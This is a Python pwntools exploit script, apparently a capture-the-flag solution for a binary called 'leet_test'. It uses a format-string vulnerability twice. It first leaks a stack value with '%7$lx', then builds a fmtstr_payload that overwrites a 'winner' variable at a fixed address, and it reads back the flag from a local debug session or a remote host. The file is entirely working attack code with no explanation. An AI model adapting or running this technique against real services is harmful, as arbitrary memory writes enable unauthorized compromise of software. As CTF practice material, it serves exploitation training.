#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io):
    winner = 0x404078
    io.sendline(b"AAAAAAAA%7$lx")
    io.recvuntil(b"AAAAAAAA")
    n = int(io.recv(4).decode(), 16)
    fmt = fmtstr_payload(10, {winner: n*0x1337c0de})
    io.sendlineafter(b"name: ", fmt) 
    
    io.recvuntil(b"Come right in! ")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./leet_test")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT) 

    exploit(io)


if __name__ == "__main__":
    main()
